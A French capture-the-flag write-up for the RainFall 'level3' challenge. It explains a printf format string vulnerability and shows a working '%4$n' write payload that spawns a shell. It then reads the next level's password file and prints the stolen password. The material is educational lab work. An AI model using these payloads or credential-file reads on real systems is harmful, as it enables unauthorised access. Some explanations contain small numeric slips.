# Exploitation du niveau 3 : Format String Attack

Dans ce document, je vais expliquer comment j'ai exploité une vulnérabilité de format string dans le programme `level3` pour obtenir un shell interactif. Le processus a impliqué plusieurs étapes, telles que la découverte de l'adresse de la variable `m`, l'injection de cette adresse en Little Endian et l'utilisation de la vulnérabilité pour contrôler l'exécution du programme.

## 1. **Comprendre le programme**
Le programme `level3` contient une vulnérabilité de type format string qui permet d'injecter des données arbitraires dans le programme via la fonction `printf`. Le but de l'exploitation était de manipuler la variable `m` pour exécuter une commande `system("/bin/sh")` et obtenir un shell.

### Code source du programme :
```c
void v(void)
{
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  printf(local_20c);
  if (m == 0x40) {
    fwrite("Wait what?!\n",1,0xc,stdout);
    system("/bin/sh");
  }
  return;
}

void main(void)
{
  v();
  return;
}

```


Dans ce code, printf utilise une chaîne de format fournie par l'utilisateur. Si la valeur de m atteint 0x40, le programme exécute /bin/sh, ce qui nous permet d'obtenir un shell.

## 2. Trouver l'adresse de m
L'adresse de la variable m doit être trouvée afin de pouvoir manipuler sa valeur. Pour cela, j'ai utilisé une attaque de format string pour inspecter la pile et trouver où se situe m.

Étapes pour trouver l'adresse de m :
Utiliser gdb pour analyser la pile : J'ai exécuté le programme dans GDB pour analyser les arguments passés à printf et trouver l'adresse de m.
```bash
gdb
Copy code
break v
run
info frame
```

### Exploiter le format string : J'ai utilisé la commande suivante pour afficher les valeurs dans la pile avec %x :

```bash
level3@RainFall:~$ (python -c "print('AAAAA' + '%x.' * 5)"; cat -) | ./level3
AAAAA200.b7fd1ac0.b7ff37d0.41414141.2e782541.
```
Cette commande affiche les valeurs hexadécimales présentes sur la pile. J'ai pu observer que "AAAAA" qui en hexadecimal correspond a 414414141 apparaissait en 4ème position dans la sortie.
Donc le debut de notre format string est la 4eme valeur de la stack

### 3. Injection de l'adresse de m en Little Endian
Une fois l'adresse de m obtenue, il fallait l'injecter dans le programme. Le format string permet d'écrire des valeurs dans des adresses mémoire via %n. Cependant, printf attend que l'adresse soit injectée dans la pile en Little Endian (ordre des octets inversé).

L'adresse 0x804988c doit être convertie en Little Endian pour l'injecter correctement dans la pile. Cela donne \x8c\x98\x04\x08.

Exemple de conversion en Little Endian :
L'adresse de m : 0x804988c
En Little Endian : \x8c\x98\x04\x08


### 4. Construire le payload final
Maintenant que nous avons l'adresse de m et que nous savons où elle se trouve dans la pile, il faut créer un payload qui écrit dans cette adresse. Le payload doit contenir l'adresse de m en Little Endian et un format %4$n pour écrire la valeur à l'adresse de m.

Payload final :
bash
Copy code
(python -c "print('\x8c\x98\x04\x08' + 'a' * 60 + '%4$n')"; cat -) | ./level3
Explication du payload :
'\x8c\x98\x04\x08' : L'adresse de m en Little Endian.
'a' * 60 : 60 caractères 'a' pour faire le padding nécessaire et aligner la pile.
'%4$n' : %4$n écrit la valeur (le nombre de caractères imprimés) à l'adresse située en 4ème position de la pile (l'adresse de m).
Résultat du payload :
Ce payload permet de faire en sorte que la valeur 60 (le nombre de caractères avant %4$n) soit écrite à l'adresse 0x804988c, modifiant ainsi la valeur de m.

### 5. Exécution du shell
Une fois que la valeur de m est modifiée pour être égale à 0x40, la condition if (m == 0x40) dans le programme est satisfaite. Le programme exécute alors la commande system("/bin/sh"), ce qui nous donne un shell interactif.

### Résultat final :
```bash
level3@RainFall:~$ (python -c 'print("\x8c\x98\x04\x08" + "a" * 60 + "%4$n")'; cat -) | ./level3
�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
6. Conclusion
Grâce à l'attaque de format string, j'ai pu obtenir l'adresse de la variable m, manipuler cette adresse pour y écrire une valeur spécifique, et finalement obtenir un shell. Ce type d'attaque est très puissant et démontre l'importance de valider correctement les entrées utilisateur pour éviter les vulnérabilités de type format string.